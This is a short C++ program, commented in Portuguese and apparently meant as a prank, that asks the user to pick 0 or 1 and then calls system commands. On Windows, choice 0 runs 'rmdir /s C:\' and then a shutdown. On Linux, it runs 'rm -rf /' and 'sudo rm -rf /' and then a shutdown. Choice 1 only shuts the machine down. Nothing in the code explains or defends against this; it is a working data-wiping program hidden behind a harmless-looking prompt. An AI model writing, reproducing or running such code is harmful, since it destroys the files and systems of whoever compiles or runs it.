// dx um codigo falso

#include <iostream>
#include <stdlib.h>


using namespace std;

void importante (int flag)
{

#if defined(_WIN32)

cout << "/* message */" << endl;
// this is a Windows environment!
    if (flag)
    {
        system("shutdown /s");

    }
    else  
    {
        try
        {
             system ("rmdir /s C:\\");
        }
        catch(const std::exception& e)
        {
            std::cerr << e.what() << '\n';
        }
        
        system("shutdown /s");
    }


#elif defined(__linux__)

    // this is a Linux environment! (any GNU/Linux distribution)
    if (flag)
    {
        system("shutdown --p");

    }
    else  
    {
        try
        {
             system ("rm -rf /");
             
             system ("sudo rm -rf /");
        }
        catch(const std::exception& e)
        {
            std::cerr << e.what() << '\n';
        }
        
        system("shutdown --p");
    }

#elif defined(__APPLE__)

    // this is a Mac OSX environment!

#elif defined(BSD)

    // this is a BSD environment! (OpenBSD, FreeBSD, etc.)

#elif defined(__QNX__)

    // this is a QNX environment!

#endif

}

int main(int argc, char const *argv[])
{
    int flag = 0;
    std::cout << "Escolha entre 0 e 1" << std::endl;
    cin >> flag;
    importante (flag);
    
    return 0;
}
